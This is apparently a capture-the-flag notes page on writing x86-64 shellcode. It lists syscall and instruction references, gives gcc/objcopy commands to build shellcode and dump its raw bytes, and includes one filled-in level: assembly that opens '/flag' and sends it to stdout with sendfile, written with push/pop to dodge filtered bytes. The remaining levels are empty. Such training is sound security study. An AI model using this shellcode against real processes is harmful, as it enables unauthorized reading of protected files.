# level
[x64.syscall.sh](https://x64.syscall.sh/): Your cheat sheet for syscalls. A glance here, and you're always ahead.

[syscalls manpage](https://man7.org/linux/man-pages/man2/syscalls.2.html): Understand not just the calls, but their deeper implications.

[felix cloutier](https://www.felixcloutier.com/x86/): Dive into the heartbeats of instructions, ensuring you're always in step.

[x86s reference](http://ref.x86s.net/coder64.html): Decode the bytes into moves, turning the tables on any challenge.

![图片](https://github.com/user-attachments/assets/38ff999a-07f2-4e20-be0b-c2b334a53c96)

![图片](https://github.com/user-attachments/assets/8fe712d1-8a9f-4666-a2d1-87269b321048)


```sh
# compile to elf
gcc -nostdlib -static shellcode.s -o sc-elf
```
```sh
# raw bytes
objcopy --dump-section .text=sc-raw sc-elf
```
```sh
# to debug
strace ./sc-elf
gdb ./sc-elf
```
![图片](https://github.com/user-attachments/assets/de1bf64d-7fd0-48af-bfdd-fa25089b2fbd)

```sh
gcc -nostdlib -static zzz.s -o yyy && objcopy --dump-section .text=xxx yyy
```

## 4
```s
.intel_syntax noprefix
.globl _start

.section .text

_start:

push 0x616c662f
mov dword ptr [rsp+4],0x67  # mov rbx,0x00000067616c662f; push rbx
push rsp
pop rdi                     # mov rdi,rsp
push 0
pop rsi                     # xor rsi,rsi
push 2
pop rax                     # mov rax,2
syscall

push 1
pop rdi                     # mov rdi,1
push rax
pop rsi                     # mov rsi,rax
push 0
pop rdx                     # xor rdx,rdx
push 60
pop r10                     # mov r10,60
push 40
pop rax                     # mov rax,40
syscall

push 0                      
pop rdi                     # xor rdi,rdi
push 60
pop rax                     # mov rax,60
syscall

.section .data

```
## 5
```s

```
## 6
```s

```
## 7
```s

```
## 8
```s

```
## 9
```s

```
## 10
```s

```
## 11
```s

```
## 12
```s

```
## 13
```s

```
## 14
```s

```
